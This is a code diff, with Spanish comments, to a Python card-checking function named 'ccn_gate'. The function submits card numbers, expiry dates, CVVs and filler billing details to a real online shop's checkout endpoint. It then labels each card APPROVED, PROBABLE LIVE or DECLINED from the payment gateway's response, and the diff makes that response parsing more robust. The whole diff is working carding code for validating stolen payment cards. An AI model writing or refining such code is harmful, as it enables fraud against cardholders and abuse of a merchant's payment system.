@@ -100,23 +100,35 @@ def ccn_gate(card):
             data    = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}&billing%5Baddress%5D={street}&billing%5Bcity%5D=EUGENE&billing%5Bstate%5D=Oregon&billing%5BpostalCode%5D=10080&billing%5Bcountry%5D=US&shipping%5Bname%5D={name}+{last}&shipping%5Baddress%5D={street}&shipping%5Bcity%5D=eugene&shipping%5Bstate%5D=Oregon&shipping%5BpostalCode%5D=97402&shipping%5Bcountry%5D=US"
             result  = cliente.post(url="https://glorybee.com/paya/checkout/request", data=data, headers=headers)
             
-            # --- Extracción de la Respuesta ---
+            # --- Extracción de la Respuesta MEJORADA ---
             message_text = "UNKNOWN_MESSAGE"
             message_code = "UNKNOWN_CODE"
             
             try:
+                # 1. Intenta parsear como JSON
                 response_json = result.json()
                 payment_response = response_json.get('paymentresponse', '')
                 
-                # Captura de mensaje y código
+                # Captura de mensaje y código dentro del JSON
                 message_text = capture(payment_response, '"message":"', '"')
                 message_code = capture(payment_response, '"code":"', '"')
-            except Exception as e:
-                # Esto sucede si result.json() falla o la estructura JSON no es la esperada
-                message_text = f"JSON Error: {str(e)}"
-                message_code = "JSON_PARSE_FAIL"
+                
+            except Exception:
+                # 2. Si falla el JSON, intenta capturar directamente del texto de la respuesta
+                # Se busca el mensaje de error de AMEX u otro
+                if "invalid card number" in result.text.lower():
+                    message_text = "Invalid Card Number (Possible AMEX/Format Error)"
+                    message_code = "400"
+                elif "declined" in result.text.lower():
+                    # Si no es JSON pero dice declined, tomamos un mensaje genérico
+                    message_text = "Transaction Declined (Non-JSON Response)"
+                    message_code = "DECLINE_TEXT"
+                else:
+                    # Último recurso: si el texto no es útil, se deja el mensaje de error anterior
+                    message_text = "No se pudo obtener la respuesta del Gateway (Revisar formato de tarjeta)"
+                    message_code = "NON_JSON_FAIL"
             
-            # Si la captura falla, debemos usar un valor predeterminado
+            # Si la captura falla dentro del JSON (p. ej. message_text es None), usamos los valores predeterminados.
             if not message_text: message_text = "GATEWAY_MESSAGE_NOT_FOUND"
             if not message_code: message_code = "GATEWAY_CODE_NOT_FOUND"
 
@@ -125,21 +137,19 @@ def ccn_gate(card):
 
             # 1. Aprobada por AVS
             if "AVS FAILURE" in result.text:
-                # Retorna: CC|MM|YYYY|CVV|APPROVED|AVS FAILURE||
                 return f"{card}|APPROVED|AVS FAILURE|" 
 
             # 2. Live probable o CVV Match (La clave para la aprobación)
             elif "CVV2 MISMATCH" in message_text:
-                # Retorna: CC|MM|YYYY|CVV|APPROVED|CVV2 MISMATCH|0000N7|
                 return f"{card}|APPROVED|CVV2 MISMATCH|{message_code}|"
 
             # 3. Live probable (ej. "There was a problem with the request.")
-            elif "There was a problem with the request." in message_text:
-                # Retorna: CC|MM|YYYY|CVV|PROBABLE LIVE|There was a problem with the request.|CODE|
+            elif "There was a problem with the request." in message_text or "PROBABLE LIVE" in message_text:
+                # Usamos 'PROBABLE LIVE' como estado si el texto es genérico de error que a veces da LIVE
                 return f"{card}|PROBABLE LIVE|{message_text}|{message_code}|"
                 
             # 4. Rechazada/Declinada (El resto de respuestas)
-            # Retorna: CC|MM|YYYY|CVV|DECLINED|SUSPECTED FRAUD|000059|
+            # Esto incluye los errores de JSON y los mensajes de rechazo.
             return f"{card}|DECLINED|{message_text}|{message_code}|"
             
         except Exception as e:
@@ -150,7 +160,6 @@ def ccn_gate(card):
             continue
             
     # Bloque ELSE (Se ejecuta si se agotaron los reintentos)
-    # Retorna: CC|MM|YYYY|CVV|ERROR|Max Retries...|
     return f"{card}|ERROR|Max Retries: Fallo de conexión o límite de intentos ({max_retries} reintentos)." 
 
 
